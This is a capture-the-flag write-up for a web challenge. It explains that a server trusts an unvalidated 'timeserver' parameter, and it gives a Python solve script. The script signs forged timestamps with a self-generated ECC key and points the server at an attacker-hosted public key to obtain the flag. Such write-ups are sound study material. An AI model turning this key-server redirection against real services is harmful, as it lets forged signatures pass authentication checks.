https://ctftime.org/event/2377

# one-day-one-letter (web)

The challenge consists of two servers, one that display some content and one that host both
the private and public keys.
The server doesnt validade the "timeserver" parameter though so we can just create our own pair of keys
and point to our server.

## Solution

```python
#!/usr/bin/env python3
import requests

from Crypto.Hash import SHA256
from Crypto.PublicKey import ECC
from Crypto.Signature import DSS
import time

# gen key
# key = ECC.generate(curve='p256')
# open("key.txt", "w").write(key.export_key(format='PEM'))
# pubkey = key.public_key().export_key(format='PEM')
# open("pub.txt", "w").write(pubkey)
# host with whatever

REMOTE = "https://web-one-day-one-letter-content-lz56g6.wanictf.org/"

def make_body(adjust):
    key = open("key.txt", "rb").read()

    timestamp = str(int(time.time()) + adjust).encode("utf-8")
    h = SHA256.new(timestamp)
    key = ECC.import_key(key)
    signer = DSS.new(key, "fips-186-3")
    signature = signer.sign(h)
    return (timestamp, signature)

for i in range(0, 12):
    timestamp, signature = make_body(-90000 * i) 

    res = requests.post(
        REMOTE,
        json={
            "timestamp": timestamp.decode(),
            "signature": signature.hex(),
            "timeserver": "<hostname>",
        },
    )
    print(f"DEBUGPRINT[1]: solve.py:27: res.text={res.text}")
```

## Flag
`FLAG{lyingthetime}`

shafouz 2024/06/23
